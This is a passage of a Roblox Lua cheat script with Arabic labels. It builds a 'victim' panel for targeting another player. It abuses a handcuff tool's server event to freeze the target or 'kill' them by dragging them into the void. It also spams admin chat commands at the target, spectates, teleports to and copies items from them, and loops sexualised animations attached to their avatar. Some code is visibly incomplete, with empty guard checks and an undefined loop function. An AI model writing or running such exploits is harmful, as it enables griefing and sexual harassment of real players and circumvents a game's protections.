openCommandButton.Font = Enum.Font.SourceSansBold
openCommandButton.TextSize = 18
openCommandButton.Parent = scrollFrame

-- زر الأمر (نسخ 2)
local copyCommandButton2 = Instance.new("TextButton")
copyCommandButton2.Name = "CopyCommandButton2"
copyCommandButton2.Size = UDim2.new(0.3, 0, 0.07, 0)
copyCommandButton2.Position = UDim2.new(0.01, 0, 0.67, 0) -- بجانب زر نسخ 1
copyCommandButton2.Text = "نسخ 2 (ادمن)"
copyCommandButton2.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
copyCommandButton2.TextColor3 = Color3.new(0, 0, 0)
copyCommandButton2.Font = Enum.Font.SourceSansBold
copyCommandButton2.TextSize = 18
copyCommandButton2.Parent = scrollFrame


local flangCommandButton = Instance.new("TextButton")
flangCommandButton.Name = "FlangCommandButton"
flangCommandButton.Size = UDim2.new(0.3, 0, 0.07, 0)
flangCommandButton.Position = UDim2.new(0.32, 0, 0.58, 0)
flangCommandButton.Text = "فلنج(قريبا)"
flangCommandButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- اللون الذهبي
flangCommandButton.TextColor3 = Color3.new(0, 0, 0) -- النص الأسود
flangCommandButton.Font = Enum.Font.SourceSansBold
flangCommandButton.TextSize = 18
flangCommandButton.Parent = scrollFrame

-- زر الأمر (.re)
local reCommandButton = Instance.new("TextButton")
reCommandButton.Size = UDim2.new(0.3, 0, 0.07, 0)
reCommandButton.Position = UDim2.new(0.32, 0, 0.67, 0)
reCommandButton.Text = "re(ادمن)"
reCommandButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
reCommandButton.TextColor3 = Color3.new(0, 0, 0)
reCommandButton.Font = Enum.Font.SourceSansBold
reCommandButton.TextSize = 18
reCommandButton.Parent = scrollFrame

-- زر إرسال اسم عشوائي
local randomTitleButton = Instance.new("TextButton")
randomTitleButton.Size = UDim2.new(0.3, 0, 0.07, 0)
randomTitleButton.Position = UDim2.new(0.32, 0, 0.76, 0)
randomTitleButton.Text = "(ادمن)تغير سكن"
randomTitleButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
randomTitleButton.TextColor3 = Color3.new(0, 0, 0)
randomTitleButton.Font = Enum.Font.SourceSansBold
randomTitleButton.TextSize = 18
randomTitleButton.Parent = scrollFrame

-- إضافة زر قتل كلبش إلى صفحة الضحية
local killKlbshButton = Instance.new("TextButton")
killKlbshButton.Size = UDim2.new(0.3, 0, 0.07, 0)
killKlbshButton.Position = UDim2.new(0.32, 0, 0.49, 0) -- بجانب زر الكلبشة
killKlbshButton.Text = "قتل كلبش"
killKlbshButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون أحمر
killKlbshButton.TextColor3 = Color3.new(0, 0, 0)
killKlbshButton.Font = Enum.Font.SourceSansBold
killKlbshButton.TextSize = 18
killKlbshButton.Parent = scrollFrame

-- إضافة زر التجميد التلقائي
local autoFreezeButton = Instance.new("TextButton")
autoFreezeButton.Size = UDim2.new(0.3, 0, 0.07, 0)
autoFreezeButton.Position = UDim2.new(0.01, 0, 0.58, 0)  
autoFreezeButton.Text = "التجميد المتكرر"
autoFreezeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
autoFreezeButton.TextColor3 = Color3.new(0, 0, 0)
autoFreezeButton.Font = Enum.Font.SourceSansBold
autoFreezeButton.TextSize = 18
autoFreezeButton.Parent = scrollFrame

-- إضافة زر القتل المتكرر
local autoKillButton = Instance.new("TextButton")
autoKillButton.Size = UDim2.new(0.3, 0, 0.07, 0)
autoKillButton.Position = UDim2.new(0.01, 0, 0.49, 0)
autoKillButton.Text = "القتل المتكرر"
autoKillButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
autoKillButton.TextColor3 = Color3.new(0, 0, 0)
autoKillButton.Font = Enum.Font.SourceSansBold
autoKillButton.TextSize = 18
autoKillButton.Parent = scrollFrame

-- إضافة زر الإصبع إلى صفحة الضحية
local fingerButton = Instance.new("TextButton")
fingerButton.Name = "FingerButton"
fingerButton.Size = UDim2.new(0.09, 0, 0.1, 0)
fingerButton.Position = UDim2.new(0.53, 0, 0.01, 0) -- بجانب أزرار المص والبانج
fingerButton.Text = "الإصبع"
fingerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100) -- لون مميز
fingerButton.TextColor3 = Color3.new(1, 1, 1)
fingerButton.Font = Enum.Font.SourceSansBold
fingerButton.TextSize = 18
fingerButton.Parent = scrollFrame

-- إضافة زر نسخ أدمن تلقائي
local autoAdminCopyButton = Instance.new("TextButton")
autoAdminCopyButton.Size = UDim2.new(0.3, 0, 0.07, 0)
autoAdminCopyButton.Position = UDim2.new(0.01, 0, 0.85, 0)
autoAdminCopyButton.Text = "نسخ أدمن تلقائي"
autoAdminCopyButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
autoAdminCopyButton.TextColor3 = Color3.new(0, 0, 0)
autoAdminCopyButton.Font = Enum.Font.SourceSansBold
autoAdminCopyButton.TextSize = 18
autoAdminCopyButton.Parent = scrollFrame

-- إضافة زر إخفاء اللاعب
local hidePlayerButton = Instance.new("TextButton")
hidePlayerButton.Size = UDim2.new(0.3, 0, 0.07, 0)
hidePlayerButton.Position = UDim2.new(0.32, 0, 0.85, 0) -- وضعته أسفل زر نسخ أدمن تلقائي
hidePlayerButton.Text = "إخفاء اللاعب"
hidePlayerButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون برتقالي
hidePlayerButton.TextColor3 = Color3.new(0, 0, 0)
hidePlayerButton.Font = Enum.Font.SourceSansBold
hidePlayerButton.TextSize = 18
hidePlayerButton.Parent = scrollFrame

-- متغير لتخزين اللاعب الذي تم العثور عليه
local foundPlayer = nil

-- وظيفة للبحث عن اللاعب وعرض المعلومات
local function findAndDisplayPlayer(partialName)
    foundPlayer = nil
    local matchingPlayers = {}

    -- التحقق من طول النص المدخل
    local isExactMatch = #partialName > 4

    -- البحث عن اللاعبين
    for _, player in pairs(game.Players:GetPlayers()) do
        if isExactMatch then
            -- إذا كان النص المدخل أكثر من 4 أحرف، نبحث عن تطابق كامل
            if player.Name:lower() == partialName:lower() or 
               (player.DisplayName and player.DisplayName:lower() == partialName:lower()) then
                table.insert(matchingPlayers, player)
            end
        else
            -- إذا كان النص المدخل 4 أحرف أو أقل، نبحث عن تطابق جزئي
            if player.Name:lower():find(partialName:lower(), 1, true) or 
               (player.DisplayName and player.DisplayName:lower():find(partialName:lower(), 1, true)) then
                table.insert(matchingPlayers, player)
            end
        end
    end

    if #matchingPlayers == 1 then
        -- إذا كان هناك لاعب واحد فقط يتطابق
        foundPlayer = matchingPlayers[1]
        
        -- عرض صورة اللاعب
        profilePicture.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. foundPlayer.UserId .. "&width=420&height=420&format=png"
        
        -- عرض معلومات اللاعب
        infoText.Text = "اسم: " .. foundPlayer.Name .. "\n"
        infoText.Text = infoText.Text .. "اللقب: " .. (foundPlayer.DisplayName or "بدون لقب") .. "\n"
        infoText.Text = infoText.Text .. "عمر الحساب: " .. foundPlayer.AccountAge .. " يوم\n"
        infoText.Text = infoText.Text .. "الأغراض:\n"
        for _, item in pairs(foundPlayer.Backpack:GetChildren()) do
            infoText.Text = infoText.Text .. "- " .. item.Name .. "\n"
        end
        infoFrame.Visible = true
    elseif #matchingPlayers > 1 then
        -- إذا كان هناك أكثر من لاعب يتطابق مع النص المدخل
        profilePicture.Image = "" -- صورة سوداء
        infoText.Text = "⚠️ يوجد أكثر من لاعب بنفس الاسم!\n الرجاء إدخال اسم الاعب كاملا."
        infoFrame.Visible = true
    else
        -- إذا لم يتم العثور على لاعب
        profilePicture.Image = "" -- صورة سوداء
        infoText.Text = "لم يتم العثور على لاعب"
        infoFrame.Visible = false
    end

    return foundPlayer
end

-- متغير لتخزين حالة الإصبع النشطة
local fingerActive = false

local function selectPlayerWithFinger()
    fingerActive = not fingerActive
    
    if fingerActive then
        fingerButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
        fingerButton.Text = "اختر لاعباً..."
        
        local ray = Instance.new("Part")
        ray.Name = "FingerRay"
        ray.Size = Vector3.new(0.1, 0.1, 100)
        ray.Transparency = 0.7
        ray.Color = Color3.fromRGB(255, 255, 0)
        ray.Anchored = true
        ray.CanCollide = false
        ray.Parent = workspace
        
        local connection
        connection = game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
            if input.UserInputType == Enum.UserInputType.MouseButton1 and not gameProcessed then
                local mouse = game.Players.LocalPlayer:GetMouse()
                local unitRay = Ray.new(mouse.UnitRay.Origin, mouse.UnitRay.Direction * 1000)
                
                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {game.Players.LocalPlayer.Character}
                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                local result = workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000, raycastParams)
                
                if result then
                    local hitPart = result.Instance
                    local targetModel = hitPart:FindFirstAncestorOfClass("Model")
                    if targetModel then
                        local targetPlayer = game.Players:GetPlayerFromCharacter(targetModel)
                        if targetPlayer then
                            inputBox.Text = ""..targetPlayer.Name
                            findAndDisplayPlayer(targetPlayer.Name)
                            
                            -- تأثيرات بصرية لمدة ثانية واحدة
                            local highlight = Instance.new("Highlight")
                            highlight.FillColor = Color3.fromRGB(255, 0, 0)
                            highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
                            highlight.Parent = targetModel
                            
                            -- إزالة التأثير بعد ثانية واحدة
                            delay(1, function()
                                if highlight then
                                    highlight:Destroy()
                                end
                            end)
                            
                            game:GetService("StarterGui"):SetCore("SendNotification", {
                                Title = "تم التحديد",
                                Text = "تم اختيار: "..targetPlayer.Name,
                                Duration = 2
                            })
                            
                            fingerActive = false
                            fingerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
                            fingerButton.Text = "الإصبع"
                            connection:Disconnect()
                            if ray then ray:Destroy() end
                        end
                    end
                end
            end
        end)
        
        
        -- تحديث الشعاع مع حركة الماوس
        local renderStepped
        renderStepped = game:GetService("RunService").RenderStepped:Connect(function()
            local mouse = game.Players.LocalPlayer:GetMouse()
            local unitRay = Ray.new(mouse.UnitRay.Origin, mouse.UnitRay.Direction * 100)
            
            if ray then
                ray.CFrame = CFrame.new(unitRay.Origin + unitRay.Direction * 50, unitRay.Origin + unitRay.Direction * 100)
            end
        end)
        
        -- إلغاء التنشيط عند النقر مرة أخرى
        fingerButton.MouseButton1Click:Connect(function()
            if fingerActive then
                fingerActive = false
                fingerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
                fingerButton.Text = "الإصبع"
                if connection then connection:Disconnect() end
                if renderStepped then renderStepped:Disconnect() end
                if ray then ray:Destroy() end
            end
        end)
    else
        fingerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        fingerButton.Text = "الإصبع"
    end
end

-- ربط الزر بالدالة المعدلة
fingerButton.MouseButton1Click:Connect(selectPlayerWithFinger)


-- متغيرات التحكم في التكرار
local autoFreezeActive = false
local autoKillActive = false
local interval = 1 -- الفاصل الزمني بالثواني
local freezeThread, killThread = nil, nil

-- متغير لتخزين أداة الكلبشة
local klbshTool = nil
local lastKlbshCheck = 0
local checkCooldown = 10 -- ثواني بين كل فحص للأداة

-- دالة محسنة للعثور على أداة الكلبشة مع تجنب التكرار
local function findKlbshTool()
    local currentTime = tick()
    if klbshTool and klbshTool.Parent and (currentTime - lastKlbshCheck) < checkCooldown then
        return klbshTool
    end
    
    lastKlbshCheck = currentTime
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return nil end
    
    -- البحث في الظهر أولاً
    local backpack = localPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and (string.find(item.Name:lower(), "كلبش") or string.find(item.Name:lower(), "klbsh")) then
                klbshTool = item
                return klbshTool
            end
        end
    end
    
    klbshTool = nil
    return nil
end

-- دالة لضمان نقل الأداة بشكل صحيح
local function ensureToolEquipped()
    local localPlayer = game.Players.LocalPlayer
    local character = localPlayer.Character
    if not character then return false end
    
    local tool = findKlbshTool()
    if not tool then return false end
    
    -- إذا كانت الأداة ليست في الشخصية
    if tool.Parent ~= character then
        -- إزالة أي أدوات كلبشة أخرى قد تكون موجودة
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") and (string.find(item.Name:lower(), "كلبش") or string.find(item.Name:lower(), "klbsh")) then
                item.Parent = localPlayer.Backpack
            end
        end
        
        tool.Parent = character
        task.wait(0) -- انتظار قصير للتأكد من التجهيز
    end
    
    return true
end

-- وظيفة الكلبشة الأساسية المحسنة
local function performKlbsh(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local localPlayer = game.Players.LocalPlayer
    local character = localPlayer.Character
    if not character then return false end
    
    if not ensureToolEquipped() then return false end
    
    local tool = findKlbshTool()
    if not tool or not tool:FindFirstChild("RemoteEvent") then return false end
    
    local targetArm = targetPlayer.Character:FindFirstChild("RightUpperArm") or 
                     targetPlayer.Character:FindFirstChild("LeftUpperArm")
    if not targetArm then return false end
    
    -- تنفيذ الكلبشة مرة واحدة فقط
    tool.RemoteEvent:FireServer(targetArm)
    
    -- إعادة الأداة إلى الظهر بعد الاستخدام
    task.wait(0.1)
    if tool and tool.Parent == character then
        tool.Parent = localPlayer.Backpack
    end
    
    return true
end

-- وظيفة التجميد المحسنة
local function performFreeze(targetPlayer)
    if not performKlbsh(targetPlayer) then return false end
    
    pcall(function()
        game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer(4592243049)
        game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer("No")
    end)
    
    return true
end

local function performKill(targetPlayer)
    -- التحقق من صحة المدخلات
    if not targetPlayer or not targetPlayer.Character then
    end
    
    local localPlayer = game:GetService("Players").LocalPlayer
    local character = localPlayer.Character
    if not character then
    end
    
    -- التحقق من وجود الأداة وتجهيزها
    if not ensureToolEquipped() then
    end
    
    local tool = findKlbshTool()
    if not tool or not tool:FindFirstChild("RemoteEvent") then
    end
    
    -- البحث عن ذراع الهدف
    local targetArm = targetPlayer.Character:FindFirstChild("RightUpperArm") or 
                     targetPlayer.Character:FindFirstChild("LeftUpperArm")
    if not targetArm then
    end
    
    -- تنفيذ عملية القتل مع معالجة الأخطاء
    local success, err = pcall(function()
        -- حفظ المواقع الأصلية
        local originalPos = character.HumanoidRootPart.Position
        local targetOriginalPos = targetPlayer.Character.HumanoidRootPart.Position
        local originalDestroyHeight = workspace.FallenPartsDestroyHeight
        
        -- تنفيذ الكلبشة
        tool.RemoteEvent:FireServer(targetArm)
        
        -- عملية النقل للإسقاط
        workspace.FallenPartsDestroyHeight = -10000
        character.HumanoidRootPart.CFrame = CFrame.new(0, -7000, 0)
        targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -7000, 0)
        
        -- الانتظار لفترة قصيرة
        task.wait(0.2)
        
        -- استعادة المواقع الأصلية
        character.HumanoidRootPart.CFrame = CFrame.new(originalPos)
        targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetOriginalPos)
        workspace.FallenPartsDestroyHeight = originalDestroyHeight
        
        -- تنظيف بعد العملية
        task.wait(0.1)
        if tool and tool.Parent == character then
            tool.RemoteEvent:FireServer() -- إلغاء الكلبشة
            tool.Parent = localPlayer.Backpack -- إعادة الأداة
        end
    end)
    
end



-- وظائف التكرار التلقائي (بنفس الطريقة السابقة مع تعديلات طفيفة)
local function autoFreezeLoop(targetPlayer)
    while autoFreezeActive and targetPlayer do
        local success = pcall(performFreeze, targetPlayer)
        if not success then
            autoFreezeActive = false
            if freezeThread then coroutine.close(freezeThread) end
            freezeThread = nil
        end
        task.wait(interval)
    end
end



-- أحداث النقر للأزرار (تعديلها لاستخدام الوظائف المحسنة)
autoFreezeButton.MouseButton1Click:Connect(function()
    autoFreezeActive = not autoFreezeActive
    if autoFreezeActive then
        autoFreezeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        if freezeThread then coroutine.close(freezeThread) end
        freezeThread = coroutine.create(autoFreezeLoop)
        coroutine.resume(freezeThread, foundPlayer)
    else
        autoFreezeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
        if freezeThread then coroutine.close(freezeThread) end
        freezeThread = nil
    end
end)

autoKillButton.MouseButton1Click:Connect(function()
    autoKillActive = not autoKillActive
    if autoKillActive then
        autoKillButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        if killThread then coroutine.close(killThread) end
        killThread = coroutine.create(autoKillLoop)
        coroutine.resume(killThread, foundPlayer)
    else
        autoKillButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
        if killThread then coroutine.close(killThread) end
        killThread = nil
    end
end)

-- أحداث الأزرار العادية
klbshButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        pcall(performKlbsh, foundPlayer)
    end
end)

freezeButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        pcall(performFreeze, foundPlayer)
    end
end)

killKlbshButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        pcall(performKill, foundPlayer)
    end
end)


-- دالة لإرسال الرسائل في الشات الجديد
local function sendChatMessage(message)
    local TextChatService = game:GetService("TextChatService")
    local chatConfiguration = TextChatService.TextChannels.RBXGeneral
    
    if chatConfiguration then
        chatConfiguration:SendAsync(message)
    else
        -- طريقة بديلة إذا لم يعمل الشات الجديد
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
    end
end

-- متغيرات النسخ التلقائي المعدلة
local loopcheck = false
local delayval = 5 -- 5 ثواني بين كل إرسال
local cmd2spam = ""

-- دالة الإرسال المتكرر المعدلة
local function spamloop()
    while loopcheck and foundPlayer do
        -- تحديث الرسالة بناءً على اللاعب المحدد
        cmd2spam = "/e .neon "..foundPlayer.Name.." .unfly "..foundPlayer.Name.." .height "..foundPlayer.Name.." 0 .titlepk "..foundPlayer.Name.."  🥺🥺 تم الفتح من دادي "
        
        -- استخدام طريقة الإرسال المناسبة
        local success, err = pcall(function()
            game:GetService('Players'):Chat(cmd2spam)
        end)
        
        wait(delayval)
    end
end

-- حدث النقر على زر نسخ أدمن تلقائي
autoAdminCopyButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        loopcheck = not loopcheck
        autoAdminCopyButton.BackgroundColor3 = loopcheck and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(225, 215, 0)
        
        if loopcheck then
            -- بدء الإرسال المتكرر
            coroutine.wrap(spamloop)()
        end

    end
end)

-- متغيرات التحكم في إخفاء اللاعب
local hidePlayerActive = false
local hideInterval = 1 -- ثانية واحدة بين كل إرسال

-- دالة الإخفاء المتكرر
local function hidePlayerLoop()
    while hidePlayerActive and foundPlayer do
        local command = "/e .size "..foundPlayer.Name.." 0"
        
        -- إرسال الأمر
        local success, err = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
        
        -- إذا حدث خطأ، نوقف الدورة
        if not success then
            hidePlayerActive = false
            hidePlayerButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
            break
        end
        
        wait(hideInterval)
    end
end

-- حدث النقر على زر إخفاء اللاعب
hidePlayerButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        hidePlayerActive = not hidePlayerActive
        hidePlayerButton.BackgroundColor3 = hidePlayerActive and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(255, 215, 0)
        
        if hidePlayerActive then
            -- بدء الإخفاء المتكرر
            coroutine.wrap(hidePlayerLoop)()
        end
    end
end)

-- وظيفة زر (فتحوني) - إرسال لمرة واحدة
openCommandButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        local playerName = foundPlayer.Name
        local command = "/e .size "..playerName.." 3 .neon "..playerName.." .unfly "..playerName.." .height "..playerName.." 0 .titlepk "..playerName.."  🥺🥺 تم الفتح من دادي "
        
        -- إرسال الرسالة مرة واحدة فقط
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
        
    end
end)



-- متغير لتتبع حالة الرقص
local isDancing = false

-- وظيفة الزر الذكية
danceToggleButton.MouseButton1Click:Connect(function()
    if not foundPlayer then
        warn("لم يتم العثور على لاعب")
        return
    end
    
    local playerName = foundPlayer.Name
    
    if isDancing then
        -- حالة الإيقاف
        local stopCommand = "/e /unfeetdance "..playerName.." "
        game:GetService('Players'):Chat(stopCommand)
        
        danceToggleButton.Text = "ترقيص"
        danceToggleButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- يعود لأصفر
    else
        -- حالة التشغيل
        local danceCommand = "/e /feetdance "..playerName.." 3"
        game:GetService('Players'):Chat(danceCommand)
        
        danceToggleButton.Text = "إيقاف الترقيص"
        danceToggleButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100) -- أحمر للإيقاف
    end
    
    -- تبديل الحالة
    isDancing = not isDancing
end)

-- وظيفة زر (نسخ 2) - إرسال لمرة واحدة
copyCommandButton2.MouseButton1Click:Connect(function()
    if foundPlayer then
        local playerName = foundPlayer.Name
        local command = "/e .neon "..playerName.." .color "..playerName.." pk .size "..playerName.." 2 .thin "..playerName.." .sit "..playerName.." .jp "..playerName.." 1000"
        
        -- إرسال الرسالة مرة واحدة فقط
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
    end
end)
-- وظيفة زر (.re)
reCommandButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        local playerName = foundPlayer.Name
        local command = "/e .re "..playerName
        
        -- إرسال الرسالة مرة واحدة فقط
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
    end
end)

-- قائمة الأسماء
local titleNames = {
    "miri", 
    "jjjsssmmm",
    "Mone_bon1"
}

-- متغير لتتبع آخر اسم مختار
local lastTitleIndex = nil

-- وظيفة زر إرسال اللقب العشوائي
randomTitleButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        local randomIndex
        repeat
            randomIndex = math.random(1, #titleNames)
        until randomIndex ~= lastTitleIndex -- التأكد من أن العشوائي مختلف عن السابق

        -- تحديث آخر اسم مختار
        lastTitleIndex = randomIndex

        -- اختيار الاسم العشوائي من القائمة
        local selectedTitle = titleNames[randomIndex]

        -- إنشاء الأمر وإرساله
        local command = "/e .char "..foundPlayer.Name.." "..selectedTitle

        -- إرسال الرسالة مرة واحدة فقط
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
    end
end)

-- وظيفة الانتقال
teleportButton.MouseButton1Click:Connect(function()
    if foundPlayer and foundPlayer.Character then
        local localPlayer = game.Players.LocalPlayer
        local targetRootPart = foundPlayer.Character:FindFirstChild("HumanoidRootPart")
        local localRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        if targetRootPart and localRootPart then
            localRootPart.CFrame = targetRootPart.CFrame
        else
        end
    else
    end
end)


-- متغيرات المراقبة
local isSpectating = false
local spectateConnections = {}

-- دالة المراقبة المحسنة
local function setupSpectate(player)
    -- تنظيف الاتصالات السابقة
    for _, conn in pairs(spectateConnections) do
        conn:Disconnect()
    end
    spectateConnections = {}

    local camera = workspace.CurrentCamera
    
    -- دالة لتحديث الكاميرا على الشخصية الحالية
    local function updateCamera(character)
        if character and isSpectating then
            local humanoid = character:WaitForChild("Humanoid", 5) -- انتظار 5 ثواني كحد أقصى
            if humanoid then
                camera.CameraType = Enum.CameraType.Custom
                camera.CameraSubject = humanoid
            end
        end
    end

    -- متابعة الشخصية الحالية
    if player.Character then
        updateCamera(player.Character)
    end
    
    -- متابعة تغييرات الشخصية (عند الموت أو الإحياء)
    table.insert(spectateConnections, player.CharacterAdded:Connect(function(newCharacter)
        if isSpectating then
            updateCamera(newCharacter)
        end
    end))
    
    -- متابعة إزالة الشخصية (عند الموت)
    table.insert(spectateConnections, player.CharacterRemoving:Connect(function()
        if isSpectating then
            -- يمكنك إضافة تأثيرات بصرية هنا أثناء الانتظار
            camera.CameraType = Enum.CameraType.Custom
            camera.CameraSubject = nil -- أو يمكنك وضع كاميرا مؤقتة
        end
    end))
end

-- وظيفة زر المراقبة
spectateButton.MouseButton1Click:Connect(function()
    if not foundPlayer then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "خطأ",
            Text = "لم يتم تحديد لاعب",
            Duration = 2
        })
        return
    end

    isSpectating = not isSpectating
    
    if isSpectating then
        spectateButton.Text = "الكاميرا الأصلية"
        setupSpectate(foundPlayer)
    else
        spectateButton.Text = "رايته"
        -- إعادة الكاميرا للاعب المحلي
        if game.Players.LocalPlayer.Character then
            local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid then
                workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                workspace.CurrentCamera.CameraSubject = humanoid
            end
        end
        -- تنظيف الاتصالات
        for _, conn in pairs(spectateConnections) do
            conn:Disconnect()
        end
        spectateConnections = {}
    end
end)

-- وظيفة لنقل الأغراض
local function transferItemsToPlayer(sourcePlayer, targetPlayer)
    if sourcePlayer and targetPlayer then
        for _, item in pairs(sourcePlayer.Backpack:GetChildren()) do
            item:Clone().Parent = targetPlayer.Backpack
        end
    end
end

-- ربط الإدخال بالأحداث
inputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and inputBox.Text ~= "" then
        findAndDisplayPlayer(inputBox.Text)
    end
end)

transferButton.MouseButton1Click:Connect(function()
    if foundPlayer then
        local targetPlayer = game.Players.LocalPlayer
        transferItemsToPlayer(foundPlayer, targetPlayer)
    end
end)

-- نظام متابعة الشخصية للاعب المحلي واللاعب الهدف
local function setupCharacterTracking(player, callback)
    local function onCharacterAdded(character)
        local humanoid = character:WaitForChild("Humanoid")
        callback(character, humanoid)
        
        humanoid.Died:Connect(function()
            -- عند موت اللاعب، ننتظر حتى يعود
            character:WaitForChild("Humanoid")
            callback(character, humanoid)
        end)
    end
    
    -- متابعة تغيير الشخصية
    player.CharacterAdded:Connect(onCharacterAdded)
    if player.Character then
        coroutine.wrap(function() onCharacterAdded(player.Character) end)()
    end
end

-- متغيرات وظيفة المص
local sucking = false
local suckAnimTrack

local function updateSuck()
    local localCharTracker
    local targetCharTracker
    
    setupCharacterTracking(game.Players.LocalPlayer, function(character, humanoid)
        -- إعادة تحميل الأنيميشن عند تغيير الشخصية
        if suckAnimTrack then
            suckAnimTrack:Stop()
            suckAnimTrack = nil
        end
        
        if sucking then
            local animationId = "rbxassetid://5918726674"
            local animation = Instance.new('Animation')
            animation.AnimationId = animationId
            suckAnimTrack = humanoid:LoadAnimation(animation)
            suckAnimTrack:Play()
            suckAnimTrack:AdjustSpeed(1)
        end
    end)
    
    setupCharacterTracking(foundPlayer, function()
        -- عند تغيير شخصية الهدف، لا نحتاج لفعل شيء هنا
    end)
    
    while sucking do
        if not foundPlayer or not foundPlayer.Character or not game.Players.LocalPlayer.Character then
            sucking = false
            suckButton.Text = "مص"
            break
        end
        
        local humanoidRootPart = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetRootPart = foundPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart and targetRootPart then
            humanoidRootPart.CFrame = targetRootPart.CFrame * CFrame.new(0, 2, -1) * CFrame.Angles(0, math.pi, 0)
            humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        end
        
        game:GetService("RunService").Heartbeat:Wait()
    end
end

-- متغيرات وظيفة البانج
local following = false
local bangAnimationId = "10714068222"
local bangAnimTrack

local function updateBang()
    local localCharTracker
    local targetCharTracker
    
    setupCharacterTracking(game.Players.LocalPlayer, function(character, humanoid)
        -- إعادة تحميل الأنيميشن عند تغيير الشخصية
        if bangAnimTrack then
            bangAnimTrack:Stop()
            bangAnimTrack = nil
        end
        
        if following then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://" .. bangAnimationId
            bangAnimTrack = humanoid:LoadAnimation(animation)
            bangAnimTrack:Play()
            bangAnimTrack:AdjustSpeed(8)
        end
    end)
    
    setupCharacterTracking(foundPlayer, function()
        -- عند تغيير شخصية الهدف
    end)
    
    while following do
        if not foundPlayer or not foundPlayer.Character or not game.Players.LocalPlayer.Character then
            following = false
            bangButton.Text = "بانج"
            break
        end
        
        local playerHRP = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetHRP = foundPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        if playerHRP and targetHRP then
            playerHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 1)
        end
        
        game:GetService("RunService").Heartbeat:Wait()
    end
end

-- توصيل الأزرار
suckButton.MouseButton1Click:Connect(function()
    sucking = not sucking
    suckButton.Text = sucking and "إيقاف مص" or "مص"
    
    if sucking then
        if foundPlayer and foundPlayer.Character then
            coroutine.wrap(updateSuck)()
        else
            sucking = false
            suckButton.Text = "مص"
        end
    else
        if suckAnimTrack then
            suckAnimTrack:Stop()
        end
    end
end)

bangButton.MouseButton1Click:Connect(function()
    following = not following
    bangButton.Text = following and "إيقاف بانج" or "بانج"
    
    if following then
        if foundPlayer and foundPlayer.Character then
            coroutine.wrap(updateBang)()
        else
            following = false
            bangButton.Text = "بانج"
        end
    else
        if bangAnimTrack then
            bangAnimTrack:Stop()
        end
    end
end)

pages["ضحيه"] = victimPage

-- إنشاء صفحة المضادات
local antiPage = Instance.new("Frame")
antiPage.Size = UDim2.new(1, 0, 1, 0)
antiPage.Position = UDim2.new(0, 0, 0, 0)
antiPage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
antiPage.Visible = false
antiPage.Parent = rightFrame

-- عنوان الصفحة
local antiTitle = Instance.new("TextLabel")
antiTitle.Size = UDim2.new(0, 200, 0, 10)
antiTitle.Position = UDim2.new(0.5, -100, 0, 10)
antiTitle.Text = "مضادات الحماية"
